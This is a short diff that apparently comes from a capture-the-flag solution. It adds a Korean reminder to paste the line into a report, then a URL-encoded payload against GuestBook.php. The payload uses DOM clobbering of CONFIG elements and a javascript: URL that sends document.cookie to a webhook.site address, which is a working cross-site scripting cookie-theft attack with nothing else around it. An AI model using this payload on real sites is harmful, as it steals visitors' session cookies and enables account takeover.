@@ -1,0 +1,2 @@
+report에 복붙
+GuestBook.php/?content=%5Bdom%5D(%23'%20id%3D'CONFIG')%0A%5Bdom2%5D(javascript%3Atrue'%20id%3D'CONFIG'%20name%3D'debug')%0A%5Bdom3%5D(javascript%3Alocation%3D%60https%3A%2F%2Fwebhook.site%2F59347f20-78ff-41fb-8ce2-ad9354e584d9%3Fcookie%3D%60%2Bdocument.cookie'%20id%3D'CONFIG'%20name%3D'main')/
